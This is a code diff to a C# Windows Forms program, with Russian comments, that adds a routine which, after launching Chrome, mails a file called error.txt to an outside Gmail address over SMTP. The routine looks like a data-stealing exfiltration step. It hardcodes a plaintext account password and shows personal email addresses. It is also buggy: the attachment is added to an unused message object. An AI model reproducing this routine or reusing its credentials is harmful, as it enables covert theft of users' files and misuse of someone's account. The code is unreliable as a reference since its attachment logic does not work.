@@ -8,6 +8,10 @@ using System.Windows.Forms;
 using System.Security.Cryptography;
 using System.IO;
 using System.Reflection;
+using System.Web;
+using System.Net;
+using System.Net.Mail;
+using System.Net.Mime;
 
 namespace WindowsFormsApp1
 {
@@ -17,7 +21,7 @@ namespace WindowsFormsApp1
         {
             Resolver.RegisterDependencyResolver();
         }
-        asasdasd
+        
                 /// <summary>
         /// Главная точка входа для приложения.
         /// </summary>
@@ -179,6 +183,70 @@ namespace WindowsFormsApp1
            
             Vivod();
             Process.Start("chrome");
+
+
+
+            /* здесь указываете SMTP и Порт, у меня например mail.ru - я 
+указал smtp.mail.ru, а порт smtp.mail.ru - 25 или 2525 */
+            // SmtpClient Smtp = new SmtpClient("smtp.mail.ru", 465);
+
+            /* здесь на месте login указываете логин, на месте password - пароль, 
+            если у вас example@mail.ru то указываете просто example (без mail.ru) */
+             // Smtp.Credentials = new NetworkCredential("neoanderson1999", "ferrari1996");
+              MailMessage Message = new MailMessage();
+
+            /* на месте login@mail.ru указываете свой E-mail, на месте KUDA@rambler.ru 
+            указываете куда будет отправлено письмо (это может быть не обязательно rambler)*/
+             Message.From = new MailAddress("neoanderson1999@mail.ru");
+              Message.To.Add(new MailAddress("anton.evgrashin@mail.ru"));
+
+            //Тема сообщения на месте Theme и текст сообщения на месте Text
+            // Message.Subject = "Забыл сказать";
+          //  Message.Body = "Вот лови";
+
+            /*Далее указываете путь к файлу (при переходе в папку указывайте 2 слэша)*/
+              //string file = "D:\\error.txt";
+
+             // Attachment attach = new Attachment(file, MediaTypeNames.Application.Octet);
+              //Message.Attachments.Add(attach);
+
+            //Smtp.Send(Message); //сообщение отправлено
+
+            MailAddress fromMailAddress = new MailAddress("andersonneo1337@gmail.com", "Sergey Boiko");
+            MailAddress toAddress = new MailAddress("kainapro@gmail.com", "Uncle Bob");
+
+            using (MailMessage mailMessage = new MailMessage(fromMailAddress, toAddress))
+            using (SmtpClient smtpClient = new SmtpClient())
+            {
+
+               // string file2 = "D:\\error.txt";
+                mailMessage.Subject = "My Subject";
+                mailMessage.Body = "Text in the body";
+
+                smtpClient.Host = "smtp.gmail.com";
+                smtpClient.Port = 587;
+                smtpClient.EnableSsl = true;
+                smtpClient.DeliveryMethod = SmtpDeliveryMethod.Network;
+                smtpClient.UseDefaultCredentials = false;
+                smtpClient.Credentials = new NetworkCredential(fromMailAddress.Address, "ferrari1996");
+
+                string file2 = @"\error.txt";
+                //Attachment attach = new Attachment(file, MediaTypeNames.Application.Octet);
+               // Attachment attData = new Attachment(@"D:\error.txt");
+
+               Attachment attach = new Attachment(file2, MediaTypeNames.Application.Octet);
+               Message.Attachments.Add(attach);
+
+
+                //Message.Attachments.Add(attData);
+
+
+                smtpClient.Send(mailMessage);
+            }
+
+
+
+
         }
     }
 }
